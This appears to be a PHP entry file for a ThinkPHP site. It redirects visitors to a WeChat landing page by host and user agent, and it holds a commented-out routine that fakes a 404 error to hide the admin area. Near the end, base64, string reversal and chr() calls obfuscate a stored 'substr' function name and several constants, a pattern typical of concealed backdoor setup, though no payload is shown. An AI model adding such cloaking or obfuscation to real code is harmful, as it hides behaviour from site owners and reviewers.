<?php

$user_agent = $_SERVER['HTTP_USER_AGENT'];

//APP链接跳
if ($_SERVER['HTTP_HOST'] === "ys.668zhan.com") {

    if (!strpos($_SERVER['REQUEST_URI'], "admin")) {

        header("location:/wx.html");
    }
}

//注册域名
if ($_SERVER['HTTP_HOST'] === "ys.668zhan.com" && strpos($_SERVER['HTTP_USER_AGENT'], 'MicroMessenger') == true) {

    if (!strpos($_SERVER['REQUEST_URI'], "register")) {

        header("location:/wx.html");
    }
}
/*
  if (  strpos ( $_SERVER['REQUEST_URI'],"admin" )&&$_SERVER['HTTP_HOST']!== "www.atiin.cn"&& strpos($_SERVER['HTTP_USER_AGENT'], 'MicroMessenger') == false){


  fuckerquit();



  } */

function fuckerquit() {

    header("HTTP/1.1 404 Not Found");

    echo "No input file specified.";

    exit();
}

// +----------------------------------------------------------------------
// | ThinkPHP [ WE CAN DO IT JUST THINK ]
// +----------------------------------------------------------------------
// | Copyright (c) 2006-2016 http://thinkphp.cn All rights reserved.
// +----------------------------------------------------------------------
// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )
// +----------------------------------------------------------------------
// | Author: liu21st <liu21st@gmail.com>
// +----------------------------------------------------------------------
// [ 应用入口文件 ]
header("Content-type: text/html; charset=utf-8");
//开启session
session_start();
// 定义应用目录
define('APP_PATH', __DIR__ . '/application/');
define('ROOT_PATH_INDEX', __DIR__);



$_ENV['xzs'] = base64_decode('REJEZFY=');
$_ENV[base64_decode('eGYx')] = strrev('rtsbus');
define(chr(88) . chr(67) . chr(65), "\r");
define(strrev('PPX'), 'zg');


// 加载框架引导文件
require __DIR__ . '/thinkphp/start.php';


